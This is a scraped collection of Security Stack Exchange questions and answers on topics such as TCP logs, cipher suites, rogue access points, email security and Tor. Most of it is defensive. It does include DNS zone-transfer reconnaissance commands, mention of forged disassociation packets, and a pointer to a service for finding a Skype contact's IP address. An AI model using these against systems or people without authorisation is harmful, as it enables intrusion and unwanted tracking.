<pre><code>TCP: Peer 0000:0000:0000:0000:0000:ffff:d431:5861:56369/80 unexpectedly shrunk window 2522304441:2522312601 (repaired)
TCP: Peer 192.162.164.1:33760/60908 unexpectedly shrunk window 3159965547:3159965552 (repaired)
</code></pre>

<p>I have been told that these are denial of service attack on our infrastructure. If you can keep the TCP connection open indefinitely you can tie up system resources and stop legitimate clients from being able to connect to your servers. </p>

<p>How could I actually identify if these are and actual DOS attacks or some thing a lot less harmful?</p>

<ul>
<li><a href=""http://en.wikipedia.org/wiki/Sockstress"">en.wikipedia.org/wiki/Sockstress</a>  </li>
<li><a href=""http://tcpipguide.com/free/t_TCPWindowSizeAdjustmentandFlowControl.htm"">tcpipguide.com/free/t_TCPWindowSizeAdjustmentandFlowControl.htm</a> </li>
</ul>
","<p>This normally occurs when a client decides to reduce its TCP window size, without the server expecting it. This can be the case when fragmentation is an issue, or when the client is using an embedded device with very little NIC buffer memory. This is a completely normal behaviour, and you're likely to see quite a few such packets in your log. The messages are informational only, and are used to debug networking issues.</p>

<p>I'd be worried if you saw hundreds of thousands of these packets, since there are attacks that involve packet fragmentation and small window sizes, but otherwise it's just the normal sort of noise you should expect to see on any internet-facing network. In fact, the ""repaired"" part of your message is showing that your network driver fixed the issue, which is usually done by concatenating the payloads of two fragmented packets together. Shouldn't be an issue at all.</p>
","24411"
"How to check if computer is controlled remotely","41627","","<p>My laptop has windows 7 installed.</p>

<p>One Saturday night I couldn't fall asleep and was just lying in bed. Then suddenly at around 2 in the morning I heard the fan of the laptop start up and lights on the laptop started blinking. The lid was closed, and I didn't want to open it because I had a headache.</p>

<p>The fan was on and lights blinking for good half an hour, and then the laptop went back to sleep. In the morning I checked the laptop to see if any files were missing, or if anything was done. But I didn't find any problems.</p>

<p>This got me thinking.</p>

<p>How would you detect if someone has remote access program installed on your computer?</p>

<p>If you have some remote access program, can you wake up the laptop from sleep(which I think is possible since I have seen some programs like logmein.com and such)? And if so would the user be able to tell if the computer is being accessed remotely?</p>

<p>If your computer is being remotely accessed should you nuke it from orbit or can you somehow just remove whatever is allowing your computer to be accessed.</p>

<p>Thanks to anyone for their help and explanation :) I could only find solutions for linux and none for windows.</p>
","<p>You can check open port lists to see if anything unusual going on. If something looks weird, you can listen ""bad port""</p>

<p>Moreover, using some tool like processHacker, you can see what are each and every process is doing.</p>

<p>Coming back to your question, booting up a pc remotly, or awaking it from sleep, is not impossible probably, BUT I would say it is pretty hard. Especially booting it up. Even when sleeping, pc should be listening on some port so that remote attacker could send packets to wake it up. Since it is listening for an input from keyboard, it is probably doable, but pretty hard I -only- assume.</p>

<p>And booting it up is even harder since it wont be listening on anything at that time.
But there might be a device pluged in to the USB or whatsoever. </p>

<p>Either way, listening on ports and watching process would help you to catch any malware/virus.
Do not forget that, your pc might also have became a zombie which sends packets outside (zombie virus could wake the PC up also), so listen both incoming and outgoing packets.</p>

<p>Edit: Oh btw, a virus might also boot up your computer at a certain time. However this isn't done remotely. Just like Windows' update policy (which makes you pc boot up at 3 am, check for updates, if any, installs them and shuts down). A virus could also do the same thing and connect to the remote master server.</p>

<p>TLDR;
Everything is possible.</p>
","48168"
"What are the career paths in the computer security field?","41626","","<p>What sorts of jobs are there, in which organizations, with what sorts of day-to-day responsibilities?</p>

<p>What areas are good for folks coming out of school, vs what are good 2nd careers for experienced folks coming from various disciplines?</p>
","<p>As niche as ""security"" seems, it actually encompasses a few main types of roles, and a couple of areas of coverage. These are actually quite different...</p>

<p>Common roles: </p>

<ul>
<li>Enterprise IT security department<br>
These guys usually deal mostly with policy enforcement, auditing, user awareness, monitoring, maaaaybe some enterprise-wide initiatives (e.g. SIEM, IdM, etc), and an occasional Incident Response. Also probably give a security PoV on purchasing 3rd party products (whether COTS or FOSS), and in any outsourcing RFP.</li>
<li>Security team in development group (either in enterprise or in dev shops)<br>
Mostly deal with programmer education and training, some security testing (or handling external testing, see below) - this includes both pentesting and reviewing code, maybe defining security features. Some orgs will have the security team also managing risks, participating in threat modeling, etc.</li>
<li>External consultant / auditor / security tester<br>
This usually covers, in some form, all of the above, most often with an emphasis on penetration testing, code reviews, and auditing for regulatory compliance (e.g. PCI). In addition, serving as the security expert, go-to guys for the other types of organizations, such as supplying all the relevant advice.... therefore usually expected (though not necessarily the case ;-) ) to be more up to date than anyone else.</li>
<li>Researcher<br>
This can include academic level research, such as cryptologists, and also research departments in some of the larger security vendors, researching and searching for new exploits / viruses / attacks / flaws / mitigation models / etc. These can actually be quite different, vendor research is often treated as product development, whereas academic research - well, I can't really speak to that, since I don't know... </li>
</ul>

<p>Likewise, in all the above there are different areas of expertise, and an expert in one won't necessarily have anything intelligent to say in any other area:</p>

<ul>
<li>Network security, e.g. routers, firewall, network segmentation and architecture, etc.</li>
<li>O/S security, which is of course further subdivided according to O/S flavor (i.e. Windows security expert and Linux security experts might not know much about each other's stuff).</li>
<li>Application security - i.e. how to program securely (which <strong>may</strong> be necessary to subdivide according to language, technology, etc.), but also application-layer attacks, e.g. Web attacks, etc.</li>
<li>Risk management experts - more focused on the business side, less on the technical </li>
<li>Compliance officers - some places have these dedicated, and they're experts on all the relevant regulations and such (note that this is borderline lawyer-like work!)</li>
<li>Identity architects - for larger, security conscious orgs, that have complex IdM implementations and the like...</li>
<li>Auditing and forensics experts, deal mainly with SIEM/SIM/SOC, and also with investigations after the fact.  </li>
</ul>

<p>On top of that, there are some that specialize in building the secure systems (at each level of the stack), and some that spend their time breaking them - and it is not always shared expertise.</p>

<p>There are probably even more niche-niches that I'm skipping over, but you're starting to get the picture.... As you can see, what a security guy or gal does on a day to day basis is as wide and varied as the companies in which they work, and the systems which they work on. Most often, this DOES require shifting several hats, and working mostly on short tasks... BUT what stays the same (usually) is the requirement to focus on the risks (and threats), whether its mostly a technical job as defining firewall rules, or communicating with the business and lawyer types about the organization's current security posture.</p>

<p>As to how to get into the field? Ideally, you have some experience (preferably expertise) in some other field, that you can then specialize to security.<br>
You used to be network engineer? Great, start with focusing on network security, and go from there.<br>
You're currently a systems administrator? Wonderful, you've probably worked a bit on security already, start learning more in that field.<br>
You've been programming since you were a kid, and want to move to security? Fantastic, you should already have been learning about input validation, cryptography, threat mitigation, secure DB access, etc... Learn some more, figure out what you're missing, and then give me a call ;-).<br>
And so on... On the other hand, if you have no background and want to START in security, that's tougher - because as I've explained, most often the security guys is expected to be <em>the expert</em> on whatever it is. You can try to join a pentesting team, and grow from there... The important part is to focus on risk management (and, for the technical, threat modeling).  </p>

<p>I also strongly suggest reading lots of security books and blogs (I enjoy Bruce Schneier's stuff), and also try out <a href=""http://www.owasp.org/"">OWASP</a> for the application side of things.</p>
","3773"
"How to test for zone transfer?","41273","","<p>I heard that it is possible to test for zone transfer attacks on a web application using <code>host</code> and <code>dig</code> commands in Linux. How it is done?</p>
","<p>The syntax for <code>host</code> is:</p>

<pre><code>host -t axfr domain.name dns-server
</code></pre>

<p>For <code>dig</code>:</p>

<pre><code>dig axfr @dns-server domain.name
</code></pre>

<p>Replace dns-server with the authoritative DNS server and domain.name with your target domain name. </p>

<p>Keep in mind that this has very little to do with web applications, the above has to do with DNS. If we're talking about penetration testing, DNS zone transfers are a check one is more likely to perform while doing a network (rather than an application) pentest. </p>

<p>DigiNinja had put up a domain name <a href=""http://digi.ninja/projects/zonetransferme.php"">zonetransfer.me</a> for testing. Example:</p>

<pre><code>$ host -t axfr zonetransfer.me nsztm1.digi.ninja.
Trying ""zonetransfer.me""
Using domain server:
Name: nsztm1.digi.ninja.
Address: 167.88.42.94#53
Aliases: 

;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 15449
;; flags: qr aa; QUERY: 1, ANSWER: 41, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;zonetransfer.me.               IN      AXFR

;; ANSWER SECTION:
zonetransfer.me.        7200    IN      SOA     nsztm1.digi.ninja. robin.digi.ninja. 2014101001 172800 900 1209600 3600
zonetransfer.me.        301     IN      TXT     ""google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04Vl
... etc
</code></pre>
","69294"
"Tracking down a rogue access point","41110","","<p>Over the course of about a month we have received multiple reports of a rogue access point attempting to intercept traffic.  I suspect an attacker is using a <a href=""http://hakshop.myshopify.com/collections/frontpage/products/wifi-pineapple"">wifi pineapple</a>, or similar hardware device.  They seem to be enabling it for short periods of time and then disappearing before we have time to react.  When this attack pops up again I want to be able to react quickly and have them arrested.</p>

<p>What is the best way to confront this threat?</p>
","<p>The general ways that a rogue access points are found:</p>

<ul>
<li>An enterprise wi-fi access point spends some of its time not just serving clients, but listening on various channels for other wi-fi traffic. (This works best for the 2.4Ghz band where there are fewer channels. Fortunately this is also where most run-of-the-mill, non-targeted attacks are going to be. You can also use a dedicated sensor instead of an AP. You can also configure one radio of a two-radio access point as a full-time sensor radio.)
<ul>
<li>This information is typically reported to a centralized system (a controller, the controller-managing software, etc) through some mechanism (snmp trap, snmp polling, proprietary notification protocols, etc). <em>You could probably write a centralized system yourself if you really felt like it, though in practice third-party interfaces with wireless equipments' SNMP can be a little bit hit-or-miss, and the data is not available in any standardized format. There are also patent-related implications, such as <a href=""http://www.google.com/patents/US20090028118"">this one</a> which is the one that I happen to know about.</em></li>
<li>The central system will perform checks to see whether that BSSID belongs to a known, valid access point that belongs to your organization's network.</li>
<li>The central system will analyze the reported rogue for security. (For instance, a rogue access point broadcasting MyCorp's SSID on an open network is a threat to MyCorp employees, but something broadcasting a different SSID, e.g. PANERA or NEIGHBORCORP-GUEST, or a peer-to-peer wifi connection, might not be a threat.)</li>
</ul></li>
<li>Devices in the packet path, such as wi-fi controllers, can try to see if they have seen a MAC address on the wireless network which is <em>also</em> present on the wired network in an unexpected way. If they do, that's a sign that the wired network has been connected to the atmosphere, and you know what controller port it is connected to.</li>
<li>An active scan can be run on the organization's network, requesting web pages on port 80 or 443, and/or running a tool such as <code>nmap</code>, to look for indicators of common consumer-grade networking equipment (e.g. a Linksys login page).</li>
<li>The wired infrastructure (switches, routers) can be polled for bridge forwarding tables, which contain MAC addresses. These MAC addresses can be analyzed to see if they belong to an OUI of a manufacturer of wireless network equipment (e.g. Linksys).</li>
<li>You can install software on your organizations' laptops or other computers that report back many of the same types of information that the access point would detect (SSID/BSSID lists, etc) and report those to the aforementioned centralized system, or report what SSID the computer is actually connected to. It helps to be able to tell whether that laptop is in the office at home, or you'll potentially see many other access points.</li>
</ul>

<p>Actions that can be taken against these devices include:</p>

<ul>
<li>shutting down the network port at the switch (if the attacker is on your network)</li>
<li>forging 802.11 packets to disassociate clients from that access point, especially for wireless clients which your system recognizes as belonging to your organization (often called something like ""rogue containment"")</li>
<li>using a network-visualization tool that can trilaterate the location of the rogue access point from its signal strength (as reported by your access points) and your wifi network layout, then walking to that location and finding it in person
<ul>
<li>or using another signal-detection tool to track it down</li>
</ul></li>
</ul>

<p>The top 3 enterprise wireless vendors (Cisco, Aruba, Motorola) will all offer a wireless IPS with several or all of these capabilities, and some smaller vendors do as well. This is one of the many reasons they're more expensive than your cheap home Linksys wifi router.</p>
","18808"
"Is a password protected PDF file safe for bank statement attachments?","41103","","<p>My bank emails my monthly statement to me in a password protected PDF attachment. Is this a secure method of transmitting something as sensitive as bank statement?</p>
","<p>No, the use of a password protected PDF file is simply not good enough for sensitive data.</p>

<p>As others have already stated, newer version of the PDF standard use much better encryption methods than they originally did, however, a password on a file (even a strong one) will always be susceptible to brute force attacks. At this point you're just hoping their computer is slow enough that by the time they crack your (hopefully strong) password, the information is irrelevant. That's a lot of 'hopefully-s.' Assuming monthly bank statements, and a password under 50 characters, the security of your documents is starting to sound almost laughably naive.</p>

<p>This could also create a security risk in other ways depending on where the bank gets the password. I know of a bank that does something similar to this and uses your account password to encrypt the document, so that you only have to remember one password. This means they are storing your account password on the server. It may be encrypted, and it may not be, but either way it's probably safe to assume that any attacker that manages to break into your banks server and get a database dump now has your password. There is no excuse for saving passwords as anything but salted hashes (the same bank emails you your password if you forget it... yup, in a plaintext email).</p>

<p>If you can, call your bank and ask them to start sending you your statements encrypted using a public key system. <a href=""http://www.gnupg.org/"">PGP</a> and <a href=""https://en.wikipedia.org/wiki/S/MIME"">S/MIME</a> are both great, and will put a bit more security in your hands (it will be your job to protect your private key, not your banks).</p>

<p>Many banks also provide RSA tokens (or equivalent technology) for relatively cheap. Although there have been some (serious) security breaches with RSA in particular lately, this is still a great addition to your account security if your bank offers it.</p>
","10606"
"Identify and disable weak cipher suites","41089","","<p>i'm asking a question on a subject that is pure chinese to me..sorry in advance</p>

<p>A security scan result prior to the deployment of a web application on windows server 2008 R2 has raised the below message :</p>

<blockquote>
  <p>Weak SSL Cipher Suites are Supported</p>
  
  <p>Reconfigure the server to avoid the use of weak cipher suites. The configuration changes are server-specific.</p>
  
  <p>SSLCipherSuite HIGH:MEDIUM:!MD5!EXP:!NULL:!LOW:!ADH</p>
  
  <p>For Microsoft Windows Vista, Microsoft Windows 7, and Microsoft Windows Server 2008, remove the cipher suites that were identified as weak from the Supported Cipher Suite list by following these instructions:</p>
  
  <p><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/bb870930%28v=vs.85%29.aspx"">http://msdn.microsoft.com/en-us/library/windows/desktop/bb870930(v=vs.85).aspx </a></p>
</blockquote>

<p>I've tried undertsanding the msdn information but i'm totally lost in there.</p>

<p>first of all I do not undertsand which is the cipher suite that should be removed or disabled. </p>

<p>and then, how am I suppose to run the code given as example to remove a cipher suite? </p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;bcrypt.h&gt;

void main()
{

SECURITY_STATUS Status = ERROR_SUCCESS;
  LPWSTR wszCipher = (L""TLS_RSA_WITH_RC4_128_SHA"");

Status = BCryptRemoveContextFunction(
            CRYPT_LOCAL,
            L""SSL"",
            NCRYPT_SCHANNEL_INTERFACE,
            wszCipher);
</code></pre>

<p>}</p>

<p>again sorry for total lack of knowledge here!</p>
","<p>Figuring out which cipher suites to remove can be very difficult.  For Windows, I've used the free <a href=""https://www.nartac.com/Products/IISCrypto/Default.aspx"">IIS Crypto</a> tool in the past:</p>

<pre><code>IIS Crypto is a free tool that gives administrators the ability to enable or disable
protocols, ciphers, hashes and key exchange algorithms on Windows Server 2003, 2008
and 2012. It also lets you reorder SSL/TLS cipher suites offered by IIS, implement
best practices with a single click and test your website.
</code></pre>

<p>This not only leverages someone's expert knowledge as far as which algorithms are more or less secure, but also takes the pain of figuring out how to actually implement the change in Windows away (hint: it's a bunch of registry entries).</p>
","48327"
"Why doesn't the TLS protocol work without the SSLv3 ciphersuites?","40600","","<p>While disabling SSLv3 from our <code>ssl.conf</code> files to overcome the Poodle vulnerability, I also disabled the SSLv3 ciphers using <code>!SSLv3</code>. With the ciphers disabled, we were not able to access the website through Firefox and IE. The following was the error message from Firefox:</p>

<pre><code>An error occurred during a connection to xxxx.example.com.
Cannot communicate securely with peer: no common encryption algorithm(s).
(Error code: ssl_error_no_cypher_overlap)
</code></pre>

<p>So we went back and enabled the SSLv3 ciphersuite and it all started working fine. Right now, the SSLv3 protocol is disabled, but the SSLv3 ciphers are enabled.</p>

<ul>
<li>Am I assuming correctly that we got the error with one of the browsers because TLS ciphers were not available in the browser?</li>
<li>Is it possible that the protocol used is TLSv3, but the ciphers are of SSLv3?</li>
</ul>

<p></p>

<pre><code>SSLProtocol all -SSLv2 -SSLv3
#SSLProtocol -all +SSLv3
#   SSL Cipher Suite:
# List the ciphers that the client is permitted to negotiate.
# See the mod_ssl documentation for a complete list.
SSLCipherSuite ALL:!ADH:!EXPORT:!SSLv2:RC4+RSA:+HIGH:!MEDIUM:!LOW
</code></pre>

<p>We can upgrade the browsers at our office, but can't do that on our customer's machines. Is having SSLv3 protocol disabled, but with the ciphers enabled a recommended setup? In other words, are we okay with connecting through TLS with SSLv3 ciphers?</p>
","<p>I presume from your <code>ssl.conf</code> setting that you are using the <code>mod_ssl</code> module from Apache web server. This module relies on OpenSSL to provide the cryptography engine.</p>

<p>From the documentation on <a href=""https://www.openssl.org/docs/ssl/SSL_CIPHER_get_name.html"">OpenSSL</a>, it states:</p>

<blockquote>
  <p>Protocol version: SSLv2, SSLv3, TLSv1.2. <strong>The TLSv1.0 ciphers are
  flagged with SSLv3</strong>. No new ciphers were added by TLSv1.1</p>
</blockquote>

<p>You can confirm the above by running the following command:</p>

<pre><code>$ openssl ciphers -v 'TLSv1' | sort
ADH-AES128-SHA          SSLv3 Kx=DH       Au=None Enc=AES(128)  Mac=SHA1
ADH-AES256-SHA          SSLv3 Kx=DH       Au=None Enc=AES(256)  Mac=SHA1
ADH-CAMELLIA128-SHA     SSLv3 Kx=DH       Au=None Enc=Camellia(128) Mac=SHA1
ADH-CAMELLIA256-SHA     SSLv3 Kx=DH       Au=None Enc=Camellia(256) Mac=SHA1
...
</code></pre>

<p><strong>This means that if your configuration file excludes ciphersuite SSLv3, you are effectively removing support for TLSv1.0 too!</strong> That leaves you with ciphersuite TLSv1.2 only since support for SSLv2 has also been removed:</p>

<pre><code>$ openssl ciphers -v 'ALL:!ADH:!EXPORT:!SSLv2:RC4+RSA:+HIGH:!MEDIUM:!LOW:!SSLv3' | sort
AES128-GCM-SHA256       TLSv1.2 Kx=RSA      Au=RSA  Enc=AESGCM(128) Mac=AEAD
AES128-SHA256           TLSv1.2 Kx=RSA      Au=RSA  Enc=AES(128)  Mac=SHA256
AES256-GCM-SHA384       TLSv1.2 Kx=RSA      Au=RSA  Enc=AESGCM(256) Mac=AEAD
AES256-SHA256           TLSv1.2 Kx=RSA      Au=RSA  Enc=AES(256)  Mac=SHA256
...
</code></pre>

<p>From the above, it is not hard to see why you should <strong>NOT</strong> remove SSLv3 from the ciphersuite. Disabling SSLv3 protocol is more than sufficient to protect your clients from POODLE vulnerability.</p>

<p>The error message you are experiencing is likely because you are using <a href=""http://en.wikipedia.org/wiki/Transport_Layer_Security#Web_browsers"">older browsers</a> such as Firefox &lt; 27.0 or Internet Explorer &lt; 11.0 as these versions do not support TLSv1.2 by default.</p>
","70842"
"Can you get someone's IP address using Skype?","40538","","<p>If you're chatting with them via Skype, how can you get their IP address?</p>

<p>Do you need some kind of program or is there a simple, obvious way?</p>

<p>Is it illegal?</p>
","<p>For starters, I am not sure if this is illegal or not as this will most likely be dependent on your location.</p>

<p>I personally use the following site to gain the IP Address of a Skype Contact. Go to <a href=""http://resolveme.org/"" rel=""nofollow"">http://resolveme.org/</a> and enter the Skype ID of the contact you want the IP Address of. </p>
","56021"
"How do some sites detect AdBlock Plus?","40502","","<p>For example this one disables function if AdBlock plus is detected, and it works. Is there a way to circumvent this?</p>
","<p>There are many scripts and projects to help site owners detect AdBlock Plus, but I think you're interested in <em>how</em> they work.</p>

<p>The idea is simple. The website loads a JavaScript file called <code>ads.js</code> (or any other name that AdBlock Plus finds ""attractive""), which contains:</p>

<pre><code>var amIHere = document.createElement(""div"");
amIHere.setAttribute(""id"", ""amIHere"");
document.body.appendChild(amIHere); 
</code></pre>

<p>If you have AdBlock Plus, then it will block this script from running and the div won't be created. Then they use a normally-named JavaScript file which contains a simple check for the div's existence</p>

<pre><code>if (document.getElementById('amIHere')){
   alert(""You're Alright"");
}else{
   alert(""You're using AdBlock Plus"");
}
</code></pre>

<p>Other methods is to load a div with the id <code>ads</code> or that has a class <code>text-ads</code> which AdBlock Plus detects as ads and tries to hide, then using JavaScript check if the div is hidden or not.</p>

<p>This will help you detect the majority of AdBlock Plus users, but because of the nature of this problem (everything happens on the client side), in theory, a user is able to circumvent all of your checks and detectors.</p>

<p>As a ""power user"", when a website I need to use tells me that I have to disable Adblock Plus, I just disable it and enable it after I finish. I don't really want to spend time and resources to find a way around it. So you can assume that the vast majority of your users won't bother. They <em>will</em> be annoyed that you're forcing them to disable it, but they'll either leave your website or just disable AdBlock Plus.</p>
","36718"
"How (in)secure is POP/IMAP/SMTP","40459","","<p>I'm making a few assumptions about basic email security, and I want to confirm or clarify some of these points to make sure I understand the big picture. Please correct me where I'm mistaken:</p>

<p><a href=""https://security.stackexchange.com/questions/24716/if-most-companies-do-not-enable-tls-for-smtp-and-imap-should-we-consider-email"">The answer to this question</a> gives some insight, but doesn't cover all I'm looking for.</p>

<p>This is all assuming a traditional email service, accessed using a desktop or mobile client, over POP or IMAP, and SMTP (ignoring webmail).</p>

<p>Suppose I'm retrieving messages - my client app passes my username and password to the POP server, which authenticates me, and sends back the messages. If I'm not using SSL/TLS, then the entire conversation, including the message and credentials, is in plaintext. And anyone watching the network traffic can intercept the entire thing. And if I am using SSL, then the entire conversation is safe, even over a public network. Do I have that right?</p>

<p>My understanding is that traditional messages are insecure when my server talks to someone else's server - so the message itself is likely vulnerable while in transit between servers, but at least with SSL my email password would be safe.</p>

<p>If I understand, PGP or similar would mean that the message itself is encrypted, so that as long as my and the recipient's private keys are safe, nobody else could read the message. But that's just the message, right? Not the IMAP/SMTP/POP connection? Meaning if I used PGP for the message, but a non-SSL connection to SMTP, I'd still be sending plaintext username and password to authenticate.</p>

<p>Basically, I'm trying to understand why an email provider would refuse to offer SSL/TLS for POP/IMAP/SMTP connections - one particular provider says they don't do it because email is inherently insecure anyway, so SSL doesn't actually do anything to protect you, and they suggest PGP for truly secure email. I'd like to argue that while SSL may not be end-to-end message protection, it would at least protect my credentials and protect my message for a significant portion of its journey (me to SMTP server, and POP server to recipient assuming they're connecting with SSL).</p>

<p>Do I have everything straight with that?</p>
","<p>To answer your question:</p>

<ul>
<li><p>If you're using SSL/TLS to access your e-mails, regardless of whether it's POP or IMAP then it would be very difficult for anyone to decipher the text of the e-mails from analysing the traffic alone. That said some large companies e.g a law firm I used to work for have a server which sat between us and the internet, stripping out the SSL so the answer is a qualified yes in saying you're safe.</p></li>
<li><p>Also if the message is still sitting on the e-mail server after you access it, then it is possible for your e-mail provider to be bribed/coerced into handing it over. Of course GPG does solve this problem. You can also ask your e-mail provider to delete messages you download through POP though you have to trust that they're both able and willing to delete the messages securely.</p></li>
<li><p>With SSL, when logging in using your e-mail password, your password cannot easily be read by intercepting the traffic between your computer and e-mail server subject to the proviso I mentioned in point one.</p></li>
<li><p>Your understanding of PGP is largely correct. If a message is sent to you encoded with your public key then only you our someone who has broken your private key can read it. The sender's private key is irrelevant as he can't use it to decode a message meant for you. If your e-mail password were sent in plain text though you're absolutely right in thinking it could be intercepted and someone could access your e-mails or send them on your behalf pretending to be you. If you used PGP at all times to encrypt and sign all messages and others did the same for you, this would protect the content of your messages though.</p></li>
<li><p>I can't imagine why an e-mail provider wouldn't want to offer SSL beyond sheer laziness. You can even get free certificates these days! Most of the free webmail providers offer SSL e.g Gmail, have you thought about using them?</p></li>
</ul>
","51555"
"Differences between using Tor browser and VPN","40439","","<p>I can't quite figure out the differences between using the Tor browser and using a VPN (like concretely proXPN). From what I understand the idea is the same, that they both hide the IP address. The only difference that I can see is that Tor seems slower because it has to pass through several computers.</p>

<p>So is using the Tor browser better in terms of hiding your identity and online traffic? Is there a difference between who can see your traffic?</p>

<p>(I am guessing that there is a difference.)</p>

<p>(I see this question <a href=""https://security.stackexchange.com/questions/56573/which-is-more-secure-a-vpn-a-proxy-server-tor-etc-and-why-so-exactly"">Which is more secure - a VPN, a proxy-server, Tor, etc.? And why so, exactly?</a> was closed as being too broad, but I hope my question is a bit more concrete.)</p>
","<h2>TL;DR</h2>

<p>Tor provides anonymous web browsing, but does not provide security.  VPN Services provides security (sort of) and anonymity, but the anonymity might be more in question depending on the service.  Since you're depending on them not logging pieces of information that may or may not be able to be traced back to you.</p>

<h2>VPNs</h2>

<p><strong>Traditional</strong> <br>
A traditional Virtual Private Network does not extend your ISP.  A VPN extends an existing private network across a public network.  For example, let's say my company has a private network with email servers, web servers (intranet), and DNS setup for company related services.  It's a private network for company employees only.  However, some employees want to work from home.  A VPN is setup so that employees can <strong>securely</strong> connect to the private network remotely.  This provides two features:</p>

<ol>
<li>Authentication - Users present their credentials to gain access to the VPN</li>
<li>Encryption - The entire tunnel between the remote user and the private network's gateway is encrypted.  </li>
</ol>

<p>Take that last statement: ""The entire tunnel between the remote user and the private network's gateway is encrypted.""  Once you're through the gateway, communication is un-encrypted. Unless the services within the private network itself use another means of secure communication.  </p>

<p><em>Keep in mind that no anonymity is provided by this setup.</em>  In fact the company knows exactly what IPs are connecting to its private network.</p>

<p><strong>VPN Services</strong> <br>
Nowadays VPN seemingly takes on many meanings, and online/cloud/[insert Internet buzzword here] have complicated things.  We see questions now, <a href=""http://torrentfreak.com/which-vpn-services-take-your-anonymity-seriously-2014-edition-140315/"" rel=""noreferrer"">""Which VPN takes your anonymity seriously?""</a>  What has happened is that VPN Services have become a kind of ""secure anonymity service"".  A service will provide secure communications to a proxy server that will then dump your communication out into the clear to whatever your destination.  </p>

<p>This is kind of like what a traditional VPN does, except now the statement of ""a VPN extends your ISP"" is kinda true.  Now you're just encrypting the first half of your communications.  It <strong>extends</strong> in the sense that you can access websites and services you might not normally be able to due to your geographic location.  But ""extends"" really isn't the right word to use.   </p>

<hr>

<p>Take <a href=""https://www.expressvpn.com/?a_aid=zpeti&amp;data1=top10"" rel=""noreferrer"">ExpressVPN</a> for example, it advertises the following:</p>

<ol>
<li>Encrypt your Internet traffic and hide your IP address from hackers and spies.</li>
<li>Access any website or app without geographic restrictions or censorship.</li>
</ol>

<p>Take out ""Encrypt your Internet traffic"" from the first statement, and you basically have an anonymous proxy.  But now that the tunnel is encrypted it's a VPN to your anonymous proxy (gateway) that then forwards your traffic on, into the public Internet.</p>

<h2>Tor Browser</h2>

<p><strong>Onion Routing</strong> <br></p>

<p>Onion routing was designed to provide complete <em>anonymity</em> to a connection.  It accomplishes this with encryption.  Three layers of encryption.  When using the Tor Network a path is determined with a <em>minimum</em> of 3 nodes (can be more).  Encryption keys are setup and exchanged between you and all three nodes.  However, only you have all of the encryption keys.  You encrypt your data with each of the nodes' keys starting with the last node's (exit node) and ending with the first (entry node).  As your data moves through the network a layer of encryption is peeled off and forwarded to the next node.</p>

<p>As you can see the exit node decrypts the last layer, and forwards your data to its destination.  Which means your data is in ""plaintext""<sup>1</sup> at this time, but complete anonymity is accomplished.  With at least 3 nodes no node knows both the source <em>and</em> destination.</p>

<p><strong>Anonymity not Security</strong> <br>
Tor does not promise secure communications.  Encryption is only used <strong>to provide anonymity between nodes</strong>, your data is not encrypted otherwise.  This is why it is still highly encouraged to use HTTPS enabled websites while using Tor.  As @LieRyan mentioned in another thread's comment, sending personally identifiable information through Tor without using other security measures will break any anonymity that Tor provides.</p>

<h2>Traffic Visibility</h2>

<p>As far as traffic visibility if there is an admin on the network they will be able to see your traffic.  Lets take a situation with a VPN; you have your remote laptop R and your private network gateway/secure anonymous proxy (G).  Now you have a private network IP that is encrypted from R to G.  A network admin sitting on G can see your plaintext<sup>1</sup>.  As stated above if you are using another secure protocol like SSL/TLS through the VPN/VPN Service then the ""plaintext"" is really encrypted, and the network admin would not see anything but encrypted data.</p>

<p>So this really depends on where the network admin is sitting in the connection, and whether or not you using a secondary secure protocol underneath the VPN.  This same logic applies to Tor.  Because as I stated earlier encryption is only used for purposes of maintaining anonymity.  </p>

<p>Both traditional VPNs and VPN services are to protect against <strong>external visibility</strong> into the network.  Neither of them will protect you from <strong>authorized administrators</strong> <em>for the network you're on</em>.  It's all about protecting your data from unauthorized eyes.  Even with SSL/TLS a website that you're visiting sees your decrypted traffic.  It has to in order to process the request.  Admins on that website can see those same requests and/or log them.  It's the security protocols used initially and in between that make the biggest difference in the security of communication. </p>

<hr>

<p><sup>1</sup> It's plaintext as far as the data that was sent is seen here.  If the data is encrypted with something like SSL/TLS before going through the onion routing then the encrypted data would be seen at this point.</p>
","72729"
"Standards for encrypting passwords in configuration files?","40211","","<p>My workplace has a standard that plaintext passwords are not allowed in application configuration files.  This makes enough sense on its face, in case someone gets access to the config files they don't automatically have access to all the privileges of that application.  In some cases it's possible and obviously preferable to have access associated with the login or otherwise avoid having a password, such as in Windows Security for SQL Server authentication, or have it configured in a third party location, such as JDBC configuration in a J2EE environment, but this is not always possible.  </p>

<ul>
<li>When I must have a password in a configuration file, what level of encryption should it carry?   </li>
<li>How do you deal with the fact that the encryption key for the password has to be either hard coded or stored in yet another config file?</li>
<li>Should the encryption keys for password be human readable?</li>
</ul>
","<p>So the following was a bit too long for a comment... </p>

<p>Perhaps taking one step back and comparing benefits of preventative and detective controls might help.  Preventative controls include encryption but you could also encode the password to make it less obvious.  This approach is meant to protect the password from accidental sharing (a b32 encoding would produce less meaningful characters (b32 produces longer string than b64).  Such an approach just increases the difficulty of memorizing the random sequence of numbers as well as the method that should be used to decode the string.  Base32/64 encoding is a simple way of protecting passwords that do not require additional logic to be built/maintained.</p>

<p>The other approaches to preventative controls would likely use encryption.  There are many different ways to protect the key.  Without getting into the details or reiterating what D.W. already posted, you can layer detective controls to improve the security posture.  For example, you can audit access to a file that contains the key.  You can correlate events (such as restarting of server/service) with access to the key file.  Any other access request (successful or not) to the key file could indicate abnormal activity.</p>

<p>To get to your questions, here's my take: </p>

<p>if you have to store password in a config file, I'd recommend at least encoding the password where possible.  Encoding the password would reduce the chance that it's leaked in the event someone scrolls through the file, say with a vendor support rep watching.  Encrypting the password is much safer, but that requires additional complexity.</p>

<p>How to deal with the fact that a key has to be hard coded or stored in another file.  Well, separating the encryption key in another file increases the difficulty for someone to view the key.  For example, you can use access control to limit access to the key file but still maintain a more open ACL for the config file.  Similarly, you can implement auditing for access to the key file, which you can use to correlate back to events that require use of key.  Hard coding the key may be fine if you limit access to the binary.  Careful encoding of password can easily be detected by running a ""strings"" against the binary.  You can encode/encrypt the hard coded password (i.e. require a separate function (perhaps with auditing) when to decode the password, but that increases the complexity for the developer and admin (i.e. how does one change the key without rebuilding/recompiling the binary?).</p>

